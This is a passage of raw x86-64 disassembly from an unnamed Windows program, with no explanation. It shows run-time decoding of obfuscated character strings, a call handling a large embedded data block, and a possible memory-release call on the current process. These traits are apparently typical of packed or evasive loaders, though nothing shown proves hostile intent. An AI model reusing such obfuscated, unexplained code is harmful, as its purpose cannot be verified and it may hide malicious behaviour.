   140006a7a:	eb 04                	jmp    0x140006a80
   140006a7c:	49 8d 3c 5f          	lea    (%r15,%rbx,2),%rdi
   140006a80:	80 3d 3b 74 28 00 00 	cmpb   $0x0,0x28743b(%rip)        # 0x14028dec2
   140006a87:	0f 84 3e 13 00 00    	je     0x140007dcb
   140006a8d:	80 3d 80 80 28 00 00 	cmpb   $0x0,0x288080(%rip)        # 0x14028eb14
   140006a94:	74 63                	je     0x140006af9
   140006a96:	66 0f 6f 05 82 3d 00 	movdqa 0x3d82(%rip),%xmm0        # 0x14000a820
   140006a9d:	00 
   140006a9e:	66 0f 6f 0d 4a 80 28 	movdqa 0x28804a(%rip),%xmm1        # 0x14028eaf0
   140006aa5:	00 
   140006aa6:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006aaa:	66 0f 6f 15 6e 3b 00 	movdqa 0x3b6e(%rip),%xmm2        # 0x14000a620
   140006ab1:	00 
   140006ab2:	66 0f db ca          	pand   %xmm2,%xmm1
   140006ab6:	66 0f 7f 0d 32 80 28 	movdqa %xmm1,0x288032(%rip)        # 0x14028eaf0
   140006abd:	00 
   140006abe:	66 0f fd 05 3a 80 28 	paddw  0x28803a(%rip),%xmm0        # 0x14028eb00
   140006ac5:	00 
   140006ac6:	66 0f db c2          	pand   %xmm2,%xmm0
   140006aca:	66 0f 7f 05 2e 80 28 	movdqa %xmm0,0x28802e(%rip)        # 0x14028eb00
   140006ad1:	00 
   140006ad2:	66 0f 6f 05 36 80 28 	movdqa 0x288036(%rip),%xmm0        # 0x14028eb10
   140006ad9:	00 
   140006ada:	66 0f fd 05 7e 3f 00 	paddw  0x3f7e(%rip),%xmm0        # 0x14000aa60
   140006ae1:	00 
   140006ae2:	66 0f db 05 a6 3b 00 	pand   0x3ba6(%rip),%xmm0        # 0x14000a690
   140006ae9:	00 
   140006aea:	66 0f 7e 05 1e 80 28 	movd   %xmm0,0x28801e(%rip)        # 0x14028eb10
   140006af1:	00 
   140006af2:	c6 05 1b 80 28 00 00 	movb   $0x0,0x28801b(%rip)        # 0x14028eb14
   140006af9:	48 8d 9d 50 10 00 00 	lea    0x1050(%rbp),%rbx
   140006b00:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140006b06:	48 89 d9             	mov    %rbx,%rcx
   140006b09:	31 d2                	xor    %edx,%edx
   140006b0b:	e8 c0 32 00 00       	call   0x140009dd0
   140006b10:	48 89 d9             	mov    %rbx,%rcx
   140006b13:	48 89 fa             	mov    %rdi,%rdx
   140006b16:	e8 c5 31 00 00       	call   0x140009ce0
   140006b1b:	48 8d 15 ce 7f 28 00 	lea    0x287fce(%rip),%rdx        # 0x14028eaf0
   140006b22:	48 89 d9             	mov    %rbx,%rcx
   140006b25:	e8 a6 31 00 00       	call   0x140009cd0
   140006b2a:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140006b31:	00 00 00 00 
   140006b35:	48 8d 0d a4 26 28 00 	lea    0x2826a4(%rip),%rcx        # 0x1402891e0
   140006b3c:	4c 8d 85 40 17 00 00 	lea    0x1740(%rbp),%r8
   140006b43:	ba c0 4b 00 00       	mov    $0x4bc0,%edx
   140006b48:	e8 23 c4 ff ff       	call   0x140002f70
   140006b4d:	48 89 c7             	mov    %rax,%rdi
   140006b50:	4c 8b b5 40 17 00 00 	mov    0x1740(%rbp),%r14
   140006b57:	48 89 d9             	mov    %rbx,%rcx
   140006b5a:	48 89 c2             	mov    %rax,%rdx
   140006b5d:	45 89 f0             	mov    %r14d,%r8d
   140006b60:	e8 eb c7 ff ff       	call   0x140003350
   140006b65:	4c 89 b5 70 14 00 00 	mov    %r14,0x1470(%rbp)
   140006b6c:	48 89 bd 00 17 00 00 	mov    %rdi,0x1700(%rbp)
   140006b73:	48 8d 95 00 17 00 00 	lea    0x1700(%rbp),%rdx
   140006b7a:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006b81:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140006b88:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140006b8e:	e8 34 a9 ff ff       	call   0x1400014c7
   140006b93:	48 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%rcx
   140006b9a:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140006ba0:	31 d2                	xor    %edx,%edx
   140006ba2:	e8 29 32 00 00       	call   0x140009dd0
   140006ba7:	80 3d 15 73 28 00 00 	cmpb   $0x0,0x287315(%rip)        # 0x14028dec3
   140006bae:	0f 84 48 12 00 00    	je     0x140007dfc
   140006bb4:	80 3d 7d 7f 28 00 00 	cmpb   $0x0,0x287f7d(%rip)        # 0x14028eb38
   140006bbb:	74 47                	je     0x140006c04
   140006bbd:	66 0f 6f 05 5b 7f 28 	movdqa 0x287f5b(%rip),%xmm0        # 0x14028eb20
   140006bc4:	00 
   140006bc5:	66 0f fd 05 b3 3e 00 	paddw  0x3eb3(%rip),%xmm0        # 0x14000aa80
   140006bcc:	00 
   140006bcd:	66 0f db 05 4b 3a 00 	pand   0x3a4b(%rip),%xmm0        # 0x14000a620
   140006bd4:	00 
   140006bd5:	66 0f 7f 05 43 7f 28 	movdqa %xmm0,0x287f43(%rip)        # 0x14028eb20
   140006bdc:	00 
   140006bdd:	f3 0f 7e 05 4b 7f 28 	movq   0x287f4b(%rip),%xmm0        # 0x14028eb30
   140006be4:	00 
   140006be5:	66 0f fd 05 a3 3e 00 	paddw  0x3ea3(%rip),%xmm0        # 0x14000aa90
   140006bec:	00 
   140006bed:	66 0f db 05 6b 3a 00 	pand   0x3a6b(%rip),%xmm0        # 0x14000a660
   140006bf4:	00 
   140006bf5:	66 0f d6 05 33 7f 28 	movq   %xmm0,0x287f33(%rip)        # 0x14028eb30
   140006bfc:	00 
   140006bfd:	c6 05 34 7f 28 00 00 	movb   $0x0,0x287f34(%rip)        # 0x14028eb38
   140006c04:	48 8d 0d 15 7f 28 00 	lea    0x287f15(%rip),%rcx        # 0x14028eb20
   140006c0b:	e8 e0 30 00 00       	call   0x140009cf0
   140006c10:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140006c14:	74 43                	je     0x140006c59
   140006c16:	48 89 c3             	mov    %rax,%rbx
   140006c19:	4c 8d 35 00 7f 28 00 	lea    0x287f00(%rip),%r14        # 0x14028eb20
   140006c20:	31 ff                	xor    %edi,%edi
   140006c22:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140006c29:	1f 84 00 00 00 00 00 
   140006c30:	48 89 f1             	mov    %rsi,%rcx
   140006c33:	4c 89 f2             	mov    %r14,%rdx
   140006c36:	49 89 d8             	mov    %rbx,%r8
   140006c39:	e8 42 31 00 00       	call   0x140009d80
   140006c3e:	85 c0                	test   %eax,%eax
   140006c40:	74 1b                	je     0x140006c5d
   140006c42:	48 89 f1             	mov    %rsi,%rcx
   140006c45:	e8 a6 30 00 00       	call   0x140009cf0
   140006c4a:	66 83 7c 46 02 00    	cmpw   $0x0,0x2(%rsi,%rax,2)
   140006c50:	48 8d 74 46 02       	lea    0x2(%rsi,%rax,2),%rsi
   140006c55:	75 d9                	jne    0x140006c30
   140006c57:	eb 08                	jmp    0x140006c61
   140006c59:	31 ff                	xor    %edi,%edi
   140006c5b:	eb 04                	jmp    0x140006c61
   140006c5d:	48 8d 3c 5e          	lea    (%rsi,%rbx,2),%rdi
   140006c61:	48 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%rcx
   140006c68:	48 89 fa             	mov    %rdi,%rdx
   140006c6b:	e8 60 30 00 00       	call   0x140009cd0
   140006c70:	48 8d 8d 70 14 00 00 	lea    0x1470(%rbp),%rcx
   140006c77:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140006c7d:	31 d2                	xor    %edx,%edx
   140006c7f:	e8 4c 31 00 00       	call   0x140009dd0
   140006c84:	80 3d 39 72 28 00 00 	cmpb   $0x0,0x287239(%rip)        # 0x14028dec4
   140006c8b:	0f 84 b8 11 00 00    	je     0x140007e49
   140006c91:	80 3d c4 7e 28 00 00 	cmpb   $0x0,0x287ec4(%rip)        # 0x14028eb5c
   140006c98:	74 67                	je     0x140006d01
   140006c9a:	66 0f 6f 05 9e 7e 28 	movdqa 0x287e9e(%rip),%xmm0        # 0x14028eb40
   140006ca1:	00 
   140006ca2:	66 0f fd 05 06 3e 00 	paddw  0x3e06(%rip),%xmm0        # 0x14000aab0
   140006ca9:	00 
   140006caa:	66 0f db 05 6e 39 00 	pand   0x396e(%rip),%xmm0        # 0x14000a620
   140006cb1:	00 
   140006cb2:	66 0f 7f 05 86 7e 28 	movdqa %xmm0,0x287e86(%rip)        # 0x14028eb40
   140006cb9:	00 
   140006cba:	f3 0f 7e 05 8e 7e 28 	movq   0x287e8e(%rip),%xmm0        # 0x14028eb50
   140006cc1:	00 
   140006cc2:	66 0f fd 05 d6 3a 00 	paddw  0x3ad6(%rip),%xmm0        # 0x14000a7a0
   140006cc9:	00 
   140006cca:	66 0f db 05 8e 39 00 	pand   0x398e(%rip),%xmm0        # 0x14000a660
   140006cd1:	00 
   140006cd2:	66 0f d6 05 76 7e 28 	movq   %xmm0,0x287e76(%rip)        # 0x14028eb50
   140006cd9:	00 
   140006cda:	f3 0f 7e 05 76 7e 28 	movq   0x287e76(%rip),%xmm0        # 0x14028eb58
   140006ce1:	00 
   140006ce2:	66 0f fd 05 d6 3d 00 	paddw  0x3dd6(%rip),%xmm0        # 0x14000aac0
   140006ce9:	00 
   140006cea:	66 0f db 05 9e 39 00 	pand   0x399e(%rip),%xmm0        # 0x14000a690
   140006cf1:	00 
   140006cf2:	66 0f 7e 05 5e 7e 28 	movd   %xmm0,0x287e5e(%rip)        # 0x14028eb58
   140006cf9:	00 
   140006cfa:	c6 05 5b 7e 28 00 00 	movb   $0x0,0x287e5b(%rip)        # 0x14028eb5c
   140006d01:	48 8d b5 70 14 00 00 	lea    0x1470(%rbp),%rsi
   140006d08:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140006d0f:	48 89 f1             	mov    %rsi,%rcx
   140006d12:	e8 c9 2f 00 00       	call   0x140009ce0
   140006d17:	48 8d 15 22 7e 28 00 	lea    0x287e22(%rip),%rdx        # 0x14028eb40
   140006d1e:	48 89 f1             	mov    %rsi,%rcx
   140006d21:	e8 aa 2f 00 00       	call   0x140009cd0
   140006d26:	80 3d 98 71 28 00 00 	cmpb   $0x0,0x287198(%rip)        # 0x14028dec5
   140006d2d:	0f 84 6d 11 00 00    	je     0x140007ea0
   140006d33:	80 3d 6c 7e 28 00 00 	cmpb   $0x0,0x287e6c(%rip)        # 0x14028eba6
   140006d3a:	0f 84 b1 00 00 00    	je     0x140006df1
   140006d40:	66 0f 6f 05 88 3d 00 	movdqa 0x3d88(%rip),%xmm0        # 0x14000aad0
   140006d47:	00 
   140006d48:	66 0f 6f 0d 10 7e 28 	movdqa 0x287e10(%rip),%xmm1        # 0x14028eb60
   140006d4f:	00 
   140006d50:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006d54:	66 0f 6f 15 c4 38 00 	movdqa 0x38c4(%rip),%xmm2        # 0x14000a620
   140006d5b:	00 
   140006d5c:	66 0f db ca          	pand   %xmm2,%xmm1
   140006d60:	66 0f 7f 0d f8 7d 28 	movdqa %xmm1,0x287df8(%rip)        # 0x14028eb60
   140006d67:	00 
   140006d68:	66 0f 6f 0d 00 7e 28 	movdqa 0x287e00(%rip),%xmm1        # 0x14028eb70
   140006d6f:	00 
   140006d70:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006d74:	66 0f db ca          	pand   %xmm2,%xmm1
   140006d78:	66 0f 7f 0d f0 7d 28 	movdqa %xmm1,0x287df0(%rip)        # 0x14028eb70
   140006d7f:	00 
   140006d80:	66 0f 6f 0d f8 7d 28 	movdqa 0x287df8(%rip),%xmm1        # 0x14028eb80
   140006d87:	00 
   140006d88:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006d8c:	66 0f db ca          	pand   %xmm2,%xmm1
   140006d90:	66 0f 7f 0d e8 7d 28 	movdqa %xmm1,0x287de8(%rip)        # 0x14028eb80
   140006d97:	00 
   140006d98:	66 0f fd 05 f0 7d 28 	paddw  0x287df0(%rip),%xmm0        # 0x14028eb90
   140006d9f:	00 
   140006da0:	66 0f db c2          	pand   %xmm2,%xmm0
   140006da4:	66 0f 7f 05 e4 7d 28 	movdqa %xmm0,0x287de4(%rip)        # 0x14028eb90
   140006dab:	00 
   140006dac:	b8 c1 00 00 00       	mov    $0xc1,%eax
   140006db1:	8b 0d e9 7d 28 00    	mov    0x287de9(%rip),%ecx        # 0x14028eba0
   140006db7:	01 c1                	add    %eax,%ecx
   140006db9:	0f b6 c9             	movzbl %cl,%ecx
   140006dbc:	66 89 0d dd 7d 28 00 	mov    %cx,0x287ddd(%rip)        # 0x14028eba0
   140006dc3:	0f b7 0d d8 7d 28 00 	movzwl 0x287dd8(%rip),%ecx        # 0x14028eba2
   140006dca:	81 c1 c1 00 00 00    	add    $0xc1,%ecx
   140006dd0:	0f b6 c9             	movzbl %cl,%ecx
   140006dd3:	66 89 0d c8 7d 28 00 	mov    %cx,0x287dc8(%rip)        # 0x14028eba2
   140006dda:	03 05 c4 7d 28 00    	add    0x287dc4(%rip),%eax        # 0x14028eba4
   140006de0:	0f b6 c0             	movzbl %al,%eax
   140006de3:	66 89 05 ba 7d 28 00 	mov    %ax,0x287dba(%rip)        # 0x14028eba4
   140006dea:	c6 05 b5 7d 28 00 00 	movb   $0x0,0x287db5(%rip)        # 0x14028eba6
   140006df1:	80 3d ce 70 28 00 00 	cmpb   $0x0,0x2870ce(%rip)        # 0x14028dec6
   140006df8:	0f 84 d3 10 00 00    	je     0x140007ed1
   140006dfe:	80 3d c5 7d 28 00 00 	cmpb   $0x0,0x287dc5(%rip)        # 0x14028ebca
   140006e05:	74 5c                	je     0x140006e63
   140006e07:	66 0f 6f 05 a1 7d 28 	movdqa 0x287da1(%rip),%xmm0        # 0x14028ebb0
   140006e0e:	00 
   140006e0f:	66 0f fd 05 b9 3c 00 	paddw  0x3cb9(%rip),%xmm0        # 0x14000aad0
   140006e16:	00 
   140006e17:	66 0f db 05 01 38 00 	pand   0x3801(%rip),%xmm0        # 0x14000a620
   140006e1e:	00 
   140006e1f:	66 0f 7f 05 89 7d 28 	movdqa %xmm0,0x287d89(%rip)        # 0x14028ebb0
   140006e26:	00 
   140006e27:	f3 0f 7e 05 91 7d 28 	movq   0x287d91(%rip),%xmm0        # 0x14028ebc0
   140006e2e:	00 
   140006e2f:	66 0f fd 05 b9 3c 00 	paddw  0x3cb9(%rip),%xmm0        # 0x14000aaf0
   140006e36:	00 
   140006e37:	66 0f db 05 21 38 00 	pand   0x3821(%rip),%xmm0        # 0x14000a660
   140006e3e:	00 
   140006e3f:	66 0f d6 05 79 7d 28 	movq   %xmm0,0x287d79(%rip)        # 0x14028ebc0
   140006e46:	00 
   140006e47:	b8 c1 00 00 00       	mov    $0xc1,%eax
   140006e4c:	03 05 76 7d 28 00    	add    0x287d76(%rip),%eax        # 0x14028ebc8
   140006e52:	0f b6 c0             	movzbl %al,%eax
   140006e55:	66 89 05 6c 7d 28 00 	mov    %ax,0x287d6c(%rip)        # 0x14028ebc8
   140006e5c:	c6 05 67 7d 28 00 00 	movb   $0x0,0x287d67(%rip)        # 0x14028ebca
   140006e63:	80 3d 5d 70 28 00 00 	cmpb   $0x0,0x28705d(%rip)        # 0x14028dec7
   140006e6a:	0f 84 b7 10 00 00    	je     0x140007f27
   140006e70:	80 3d 79 82 28 00 00 	cmpb   $0x0,0x288279(%rip)        # 0x14028f0f0
   140006e77:	0f 84 b2 00 00 00    	je     0x140006f2f
   140006e7d:	b8 18 00 00 00       	mov    $0x18,%eax
   140006e82:	48 8d 0d 43 7d 28 00 	lea    0x287d43(%rip),%rcx        # 0x14028ebcc
   140006e89:	66 0f 6f 05 3f 3c 00 	movdqa 0x3c3f(%rip),%xmm0        # 0x14000aad0
   140006e90:	00 
   140006e91:	66 0f 6f 0d 87 37 00 	movdqa 0x3787(%rip),%xmm1        # 0x14000a620
   140006e98:	00 
   140006e99:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140006ea0:	f3 0f 6f 54 41 d0    	movdqu -0x30(%rcx,%rax,2),%xmm2
   140006ea6:	f3 0f 6f 5c 41 e0    	movdqu -0x20(%rcx,%rax,2),%xmm3
   140006eac:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006eb0:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140006eb4:	66 0f db d1          	pand   %xmm1,%xmm2
   140006eb8:	66 0f db d9          	pand   %xmm1,%xmm3
   140006ebc:	f3 0f 7f 54 41 d0    	movdqu %xmm2,-0x30(%rcx,%rax,2)
   140006ec2:	f3 0f 7f 5c 41 e0    	movdqu %xmm3,-0x20(%rcx,%rax,2)
   140006ec8:	48 3d 98 02 00 00    	cmp    $0x298,%rax
   140006ece:	74 2c                	je     0x140006efc
   140006ed0:	f3 0f 6f 54 41 f0    	movdqu -0x10(%rcx,%rax,2),%xmm2
   140006ed6:	f3 0f 6f 1c 41       	movdqu (%rcx,%rax,2),%xmm3
   140006edb:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006edf:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140006ee3:	66 0f db d1          	pand   %xmm1,%xmm2
   140006ee7:	66 0f db d9          	pand   %xmm1,%xmm3
   140006eeb:	f3 0f 7f 54 41 f0    	movdqu %xmm2,-0x10(%rcx,%rax,2)
   140006ef1:	f3 0f 7f 1c 41       	movdqu %xmm3,(%rcx,%rax,2)
   140006ef6:	48 83 c0 20          	add    $0x20,%rax
   140006efa:	eb a4                	jmp    0x140006ea0
   140006efc:	0f b7 05 e9 81 28 00 	movzwl 0x2881e9(%rip),%eax        # 0x14028f0ec
   140006f03:	05 c1 00 00 00       	add    $0xc1,%eax
   140006f08:	0f b6 c0             	movzbl %al,%eax
   140006f0b:	66 89 05 da 81 28 00 	mov    %ax,0x2881da(%rip)        # 0x14028f0ec
   140006f12:	0f b7 05 d5 81 28 00 	movzwl 0x2881d5(%rip),%eax        # 0x14028f0ee
   140006f19:	05 c1 00 00 00       	add    $0xc1,%eax
   140006f1e:	0f b6 c0             	movzbl %al,%eax
   140006f21:	66 89 05 c6 81 28 00 	mov    %ax,0x2881c6(%rip)        # 0x14028f0ee
   140006f28:	c6 05 c1 81 28 00 00 	movb   $0x0,0x2881c1(%rip)        # 0x14028f0f0
   140006f2f:	44 88 64 24 38       	mov    %r12b,0x38(%rsp)
   140006f34:	48 8d 05 91 7c 28 00 	lea    0x287c91(%rip),%rax        # 0x14028ebcc
   140006f3b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006f40:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   140006f45:	48 8d 05 64 7c 28 00 	lea    0x287c64(%rip),%rax        # 0x14028ebb0
   140006f4c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006f51:	48 8d 0d 08 7c 28 00 	lea    0x287c08(%rip),%rcx        # 0x14028eb60
   140006f58:	48 8d 15 21 35 01 00 	lea    0x13521(%rip),%rdx        # 0x14001a480
   140006f5f:	4c 8d 8d 70 14 00 00 	lea    0x1470(%rbp),%r9
   140006f66:	41 b8 58 ed 26 00    	mov    $0x26ed58,%r8d
   140006f6c:	e8 4f ca ff ff       	call   0x1400039c0
   140006f71:	48 8b 8d 98 16 00 00 	mov    0x1698(%rbp),%rcx
   140006f78:	e8 e1 a4 ff ff       	call   0x14000145e
   140006f7d:	31 c0                	xor    %eax,%eax
   140006f7f:	0f 28 b5 50 17 00 00 	movaps 0x1750(%rbp),%xmm6
   140006f86:	48 81 c4 e8 17 00 00 	add    $0x17e8,%rsp
   140006f8d:	5b                   	pop    %rbx
   140006f8e:	5f                   	pop    %rdi
   140006f8f:	5e                   	pop    %rsi
   140006f90:	41 5c                	pop    %r12
   140006f92:	41 5d                	pop    %r13
   140006f94:	41 5e                	pop    %r14
   140006f96:	41 5f                	pop    %r15
   140006f98:	5d                   	pop    %rbp
   140006f99:	c3                   	ret
   140006f9a:	c6 05 b5 70 28 00 01 	movb   $0x1,0x2870b5(%rip)        # 0x14028e056
   140006fa1:	0f 10 05 04 3c 00 00 	movups 0x3c04(%rip),%xmm0        # 0x14000abac
   140006fa8:	0f 29 05 51 70 28 00 	movaps %xmm0,0x287051(%rip)        # 0x14028e000
   140006faf:	0f 10 05 06 3c 00 00 	movups 0x3c06(%rip),%xmm0        # 0x14000abbc
   140006fb6:	0f 29 05 53 70 28 00 	movaps %xmm0,0x287053(%rip)        # 0x14028e010
   140006fbd:	0f 10 05 08 3c 00 00 	movups 0x3c08(%rip),%xmm0        # 0x14000abcc
   140006fc4:	0f 29 05 55 70 28 00 	movaps %xmm0,0x287055(%rip)        # 0x14028e020
   140006fcb:	0f 10 05 0a 3c 00 00 	movups 0x3c0a(%rip),%xmm0        # 0x14000abdc
   140006fd2:	0f 29 05 57 70 28 00 	movaps %xmm0,0x287057(%rip)        # 0x14028e030
   140006fd9:	f3 0f 6f 05 0b 3c 00 	movdqu 0x3c0b(%rip),%xmm0        # 0x14000abec
   140006fe0:	00 
   140006fe1:	66 0f 7f 05 57 70 28 	movdqa %xmm0,0x287057(%rip)        # 0x14028e040
   140006fe8:	00 
   140006fe9:	48 b8 b1 00 b0 00 a7 	movabs $0x4100a700b000b1,%rax
   140006ff0:	00 41 00 
   140006ff3:	48 89 05 54 70 28 00 	mov    %rax,0x287054(%rip)        # 0x14028e04e
   140006ffa:	48 8d 0d bf 0f 00 00 	lea    0xfbf(%rip),%rcx        # 0x140007fc0
   140007001:	e8 6a a3 ff ff       	call   0x140001370
   140007006:	c6 05 8c 6e 28 00 01 	movb   $0x1,0x286e8c(%rip)        # 0x14028de99
   14000700d:	80 3d 42 70 28 00 00 	cmpb   $0x0,0x287042(%rip)        # 0x14028e056
   140007014:	0f 85 8d cd ff ff    	jne    0x140003da7
   14000701a:	e9 51 ce ff ff       	jmp    0x140003e70
   14000701f:	c6 05 52 70 28 00 01 	movb   $0x1,0x287052(%rip)        # 0x14028e078
   140007026:	66 0f 6f 05 02 36 00 	movdqa 0x3602(%rip),%xmm0        # 0x14000a630
   14000702d:	00 
   14000702e:	66 0f 7f 05 2a 70 28 	movdqa %xmm0,0x28702a(%rip)        # 0x14028e060
   140007035:	00 
   140007036:	48 b8 ac 00 b1 00 9a 	movabs $0x5d009a00b100ac,%rax
   14000703d:	00 5d 00 
   140007040:	48 89 05 29 70 28 00 	mov    %rax,0x287029(%rip)        # 0x14028e070
   140007047:	48 8d 0d b2 0f 00 00 	lea    0xfb2(%rip),%rcx        # 0x140008000
   14000704e:	e8 1d a3 ff ff       	call   0x140001370
   140007053:	c6 05 40 6e 28 00 01 	movb   $0x1,0x286e40(%rip)        # 0x14028de9a
   14000705a:	80 3d 17 70 28 00 00 	cmpb   $0x0,0x287017(%rip)        # 0x14028e078
   140007061:	0f 85 85 cf ff ff    	jne    0x140003fec
   140007067:	e9 c7 cf ff ff       	jmp    0x140004033
   14000706c:	c6 05 7b 70 28 00 01 	movb   $0x1,0x28707b(%rip)        # 0x14028e0ee
   140007073:	0f 10 05 88 3b 00 00 	movups 0x3b88(%rip),%xmm0        # 0x14000ac02
   14000707a:	0f 29 05 1f 70 28 00 	movaps %xmm0,0x28701f(%rip)        # 0x14028e0a0
   140007081:	0f 10 05 8a 3b 00 00 	movups 0x3b8a(%rip),%xmm0        # 0x14000ac12
   140007088:	0f 29 05 21 70 28 00 	movaps %xmm0,0x287021(%rip)        # 0x14028e0b0
   14000708f:	0f 10 05 8c 3b 00 00 	movups 0x3b8c(%rip),%xmm0        # 0x14000ac22
   140007096:	0f 29 05 23 70 28 00 	movaps %xmm0,0x287023(%rip)        # 0x14028e0c0
   14000709d:	0f 10 05 8e 3b 00 00 	movups 0x3b8e(%rip),%xmm0        # 0x14000ac32
   1400070a4:	0f 29 05 25 70 28 00 	movaps %xmm0,0x287025(%rip)        # 0x14028e0d0
   1400070ab:	f3 0f 6f 05 8d 3b 00 	movdqu 0x3b8d(%rip),%xmm0        # 0x14000ac40
   1400070b2:	00 
   1400070b3:	f3 0f 7f 05 23 70 28 	movdqu %xmm0,0x287023(%rip)        # 0x14028e0de
   1400070ba:	00 
   1400070bb:	48 8d 0d 7e 0f 00 00 	lea    0xf7e(%rip),%rcx        # 0x140008040
   1400070c2:	e8 a9 a2 ff ff       	call   0x140001370
   1400070c7:	c6 05 ce 6d 28 00 01 	movb   $0x1,0x286dce(%rip)        # 0x14028de9c
   1400070ce:	80 3d 19 70 28 00 00 	cmpb   $0x0,0x287019(%rip)        # 0x14028e0ee
   1400070d5:	0f 85 5e d0 ff ff    	jne    0x140004139
   1400070db:	e9 54 d1 ff ff       	jmp    0x140004234
   1400070e0:	c6 05 73 70 28 00 01 	movb   $0x1,0x287073(%rip)        # 0x14028e15a
   1400070e7:	66 0f 6f 05 d1 35 00 	movdqa 0x35d1(%rip),%xmm0        # 0x14000a6c0
   1400070ee:	00 
   1400070ef:	66 0f 7f 05 49 70 28 	movdqa %xmm0,0x287049(%rip)        # 0x14028e140
   1400070f6:	00 
   1400070f7:	48 b8 12 00 25 00 12 	movabs $0xe001200250012,%rax
   1400070fe:	00 0e 00 
   140007101:	48 89 05 48 70 28 00 	mov    %rax,0x287048(%rip)        # 0x14028e150
   140007108:	66 c7 05 47 70 28 00 	movw   $0xd1,0x287047(%rip)        # 0x14028e158
   14000710f:	d1 00 
   140007111:	48 8d 0d 08 11 00 00 	lea    0x1108(%rip),%rcx        # 0x140008220
   140007118:	e8 53 a2 ff ff       	call   0x140001370
   14000711d:	c6 05 7a 6d 28 00 01 	movb   $0x1,0x286d7a(%rip)        # 0x14028de9e
   140007124:	80 3d 2f 70 28 00 00 	cmpb   $0x0,0x28702f(%rip)        # 0x14028e15a
   14000712b:	0f 85 58 d1 ff ff    	jne    0x140004289
   140007131:	e9 ad d1 ff ff       	jmp    0x1400042e3
   140007136:	48 8d 0d 13 3b 00 00 	lea    0x3b13(%rip),%rcx        # 0x14000ac50
   14000713d:	e8 2e 0f 00 00       	call   0x140008070
   140007142:	48 8d 0d a7 10 00 00 	lea    0x10a7(%rip),%rcx        # 0x1400081f0
   140007149:	e8 22 a2 ff ff       	call   0x140001370
   14000714e:	c6 05 48 6d 28 00 01 	movb   $0x1,0x286d48(%rip)        # 0x14028de9d
   140007155:	80 3d d8 6f 28 00 00 	cmpb   $0x0,0x286fd8(%rip)        # 0x14028e134
   14000715c:	0f 85 f9 d1 ff ff    	jne    0x14000435b
   140007162:	e9 92 d2 ff ff       	jmp    0x1400043f9
   140007167:	48 8d 0d 26 3b 00 00 	lea    0x3b26(%rip),%rcx        # 0x14000ac94
   14000716e:	e8 cd 10 00 00       	call   0x140008240
   140007173:	48 8d 0d f6 11 00 00 	lea    0x11f6(%rip),%rcx        # 0x140008370
   14000717a:	e8 f1 a1 ff ff       	call   0x140001370
   14000717f:	c6 05 19 6d 28 00 01 	movb   $0x1,0x286d19(%rip)        # 0x14028de9f
   140007186:	80 3d 09 70 28 00 00 	cmpb   $0x0,0x287009(%rip)        # 0x14028e196
   14000718d:	0f 85 06 d3 ff ff    	jne    0x140004499
   140007193:	e9 96 d3 ff ff       	jmp    0x14000452e
   140007198:	c6 05 13 70 28 00 01 	movb   $0x1,0x287013(%rip)        # 0x14028e1b2
   14000719f:	66 0f 6f 05 49 35 00 	movdqa 0x3549(%rip),%xmm0        # 0x14000a6f0
   1400071a6:	00 
   1400071a7:	66 0f 7f 05 f1 6f 28 	movdqa %xmm0,0x286ff1(%rip)        # 0x14028e1a0
   1400071ae:	00 
   1400071af:	66 c7 05 f8 6f 28 00 	movw   $0x6f,0x286ff8(%rip)        # 0x14028e1b0
   1400071b6:	6f 00 
   1400071b8:	48 8d 0d e1 11 00 00 	lea    0x11e1(%rip),%rcx        # 0x1400083a0
   1400071bf:	e8 ac a1 ff ff       	call   0x140001370
   1400071c4:	c6 05 d5 6c 28 00 01 	movb   $0x1,0x286cd5(%rip)        # 0x14028dea0
   1400071cb:	80 3d e0 6f 28 00 00 	cmpb   $0x0,0x286fe0(%rip)        # 0x14028e1b2
   1400071d2:	0f 85 cd d3 ff ff    	jne    0x1400045a5
   1400071d8:	e9 04 d4 ff ff       	jmp    0x1400045e1
   1400071dd:	c6 05 f6 6f 28 00 01 	movb   $0x1,0x286ff6(%rip)        # 0x14028e1da
   1400071e4:	66 0f 6f 05 24 35 00 	movdqa 0x3524(%rip),%xmm0        # 0x14000a710
   1400071eb:	00 
   1400071ec:	66 0f 7f 05 cc 6f 28 	movdqa %xmm0,0x286fcc(%rip)        # 0x14028e1c0
   1400071f3:	00 
   1400071f4:	48 b8 11 00 48 00 5b 	movabs $0x48005b00480011,%rax
   1400071fb:	00 48 00 
   1400071fe:	48 89 05 cb 6f 28 00 	mov    %rax,0x286fcb(%rip)        # 0x14028e1d0
   140007205:	66 c7 05 ca 6f 28 00 	movw   $0xe3,0x286fca(%rip)        # 0x14028e1d8
   14000720c:	e3 00 
   14000720e:	48 8d 0d ab 11 00 00 	lea    0x11ab(%rip),%rcx        # 0x1400083c0
   140007215:	e8 56 a1 ff ff       	call   0x140001370
   14000721a:	c6 05 80 6c 28 00 01 	movb   $0x1,0x286c80(%rip)        # 0x14028dea1
   140007221:	80 3d b2 6f 28 00 00 	cmpb   $0x0,0x286fb2(%rip)        # 0x14028e1da
   140007228:	0f 85 02 d4 ff ff    	jne    0x140004630
   14000722e:	e9 57 d4 ff ff       	jmp    0x14000468a
